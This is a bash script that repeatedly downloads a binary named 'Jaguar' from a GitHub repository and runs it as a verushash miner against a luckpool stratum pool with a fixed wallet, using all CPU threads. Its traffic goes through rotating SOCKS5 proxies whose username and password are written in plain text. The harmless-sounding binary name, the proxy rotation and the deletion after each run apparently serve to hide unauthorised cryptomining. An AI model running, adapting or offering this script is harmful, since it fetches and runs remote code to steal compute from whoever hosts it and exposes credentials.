#!/bin/bash

# Define proxy configurations for each session
proxies=(
  "38.153.137.233:5541"
  "172.245.158.68:6021"
  "206.206.119.27:5938"
  "23.94.138.40:6314"
  "161.123.154.79:6609"
)

# Username and password for all proxies
username="proxymantap348"
password="jherahhra"

# Function to run ccminer with a specified proxy
run_ccminer() {
  local proxy=$1

  # Kill any leftover ccminer processes from previous runs
  pkill -f 'Jaguar'
  sleep 2  # Wait to ensure all processes are terminated

  # Set up graftcp configuration
  cat > /root/graftcp/local/graftcp-local.conf <<END
loglevel = 1
socks5 = $proxy
socks5_username = $username
socks5_password = $password
END

  # Start graftcp local proxy
  /usr/bin/graftcp-local -config /root/graftcp/local/graftcp-local.conf &
  sleep .2

  # Check public IP using the proxy
  /usr/bin/graftcp curl ifconfig.me
  echo " "
  echo " "

  # Use /usr/bin/graftcp to download Jaguar
  /usr/bin/graftcp wget https://github.com/marcelinoferdom/minse/raw/refs/heads/main/Jaguar

  # Make sure Jaguar is executable
  chmod +x Jaguar
  
  # Run ccminer in the background
  /usr/bin/graftcp ./Jaguar ---algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.NORTAMERICA --cpu-threads "$(nproc)" --proxy $username:$password@$proxy  &

  # Store the process ID (PID) of ccminer
  ccminer_pid=$!

  # Sleep for xx minutes
  sleep 7000

  # Clean up Jaguar
  rm Jaguar

  # Send SIGINT to ccminer to terminate gracefully (equivalent to Ctrl + C)
  kill -2 $ccminer_pid

  # Wait up to 10 seconds for the process to terminate
  for i in {1..10}; do
    if ! ps -p $ccminer_pid > /dev/null; then
      echo "ccminer process terminated gracefully."
      break
    fi
    sleep 1
  done

  # If the process is still running, force kill it
  if ps -p $ccminer_pid > /dev/null; then
    echo "Force killing ccminer process."
    kill -9 $ccminer_pid
  fi

  # Ensure all ccminer processes are terminated before proceeding
  pkill -f 'Jaguar'
  sleep 2  # Wait to ensure all processes are cleared
}

# Infinite loop to continuously restart the sequence of 5 runs
while true; do
  echo "Starting new cycle of proxy runs..."

  # Main loop to run ccminer with a randomly selected proxy configuration
  for ((i = 0; i < 5; i++)); do
    # Select a random proxy from the list
    proxy="${proxies[RANDOM % ${#proxies[@]}]}"
    echo "Using proxy: $proxy"
    run_ccminer "$proxy"
    sleep 200
  done

  echo "Cycle completed. Restarting the sequence..."
  sleep 200
done
